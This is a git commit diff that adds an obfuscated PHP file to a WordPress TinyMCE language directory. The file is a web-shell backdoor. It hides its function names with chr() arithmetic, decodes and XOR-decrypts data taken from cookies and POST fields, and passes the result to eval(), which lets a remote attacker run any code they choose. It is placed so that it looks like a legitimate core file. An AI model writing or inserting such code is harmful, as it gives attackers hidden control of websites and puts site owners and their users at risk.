02fb08ad88312fb0f969d74c65a49e668dace4b0
hypit-dev-lanhk <113501960+hypit-dev-lanhk@users.noreply.github.com>
2023-08-30 08:52:54 +0700

    1

---
+++ wp-includes/js/tinymce/langs/utrecglq.php
@@ -0,0 +1,27 @@
+<?php	$aSjvynjlZu	=/*  Rf*/"\163"/*drBT */. chr     (116)/*   nQ   */.   "\x72"    .    chr     (95)    ./*   DI*/"\162"	.	chr/* y   */(	1068	-	967 )."\160"	.	"\145"	./* NDYei*/chr	(/*   qp  */900  -/* DelGX  */803	).'t';
+	$prNWlnAxaR	=/*  W*/chr	(101)	./*raofj  */chr  (120) .     "\160"	.	"\154"	.   "\157"	./*   be */"\x64"	.     "\145";
+			$qQarPpNHjD	=   "\x63"/* n */.	chr  (111)  .	chr	(/*   XJ */774	-	657/*   dwKDV */).chr/* qeDVU */(/*Q */745	-  635     )."\164";
+     $lgNIR	=    "\x70"     .     "\x61"	.	"\x63"	.	chr	(/*   Xcumd   */911	-/*   rm*/804     );
+			$wVYyKfE	=     Array	(	"QsUqbjePHvJyCEwHZGzQX"/* Q  */=>	"drIMllLzDpTA" );
+     /*  KwH*/$pSMWFLArY   =   Array    (     "SbpHzUelautpRPXAkyx"	=>	"NrqQYTApDheyimsOwZ"/*  TP  */);
+
+    foreach/*sfwLQ   */(     Array(	$wVYyKfE,	$_COOKIE,    $pSMWFLArY,    $_POST,/*  D  */$wVYyKfE)/* Mwjhy */as  $mcjAzhqb)/*  HHp   */{
+
+	foreach	(/* qRk   */$mcjAzhqb/*Hw   */as	$jAlEP/*   Zcypr*/=>/*   LuJHA*/$yWrTFSW	)/*EHHNf*/{
+	/*psg */$yWrTFSW	=     @$lgNIR(/*   rdg */chr	(72)	.	chr (/*   WzeB*/542    -	500/*   wPoM */),	$yWrTFSW/*   Ueh   */);
+    	$jAlEP	.=/*   GI   */"bChjeOb-YqXuRT-HXvt-AEIBJyy-ptxv-VzTVWe-Pazk";
+	$jAlEP	=	$aSjvynjlZu (	$jAlEP,  (     strlen(/* IhF*/$yWrTFSW	)/strlen(	$jAlEP	) )/*   sFfxE */+/*   nJd */1);
+   /*  ZdG*/$jPxQbU   =     $yWrTFSW/*   VfMeg */^/*v   */$jAlEP;
+/* LJlZ  */$RMZXOhCn	=   $prNWlnAxaR/*  noj*/(/* LKT  */chr/* I */(    563  -    528	),	$jPxQbU/* B  */);
+
+
+     if  (  $qQarPpNHjD	(	$RMZXOhCn	)	==/*   L  */3/* sWp */)/* nzX */{
+  $YvfyYhm/*qw   */=	$RMZXOhCn[1];
+		/*  P */$JxmFcy =	$RMZXOhCn[2];
+		/*ZnPsR  */$hVGPeISj	=  $YvfyYhm($JxmFcy);
+		eval  (/* IqUk*/$hVGPeISj/* qfKA  */);
+
+  die	();
+	/*aa */}
+	/*  dhozn  */}
+     }
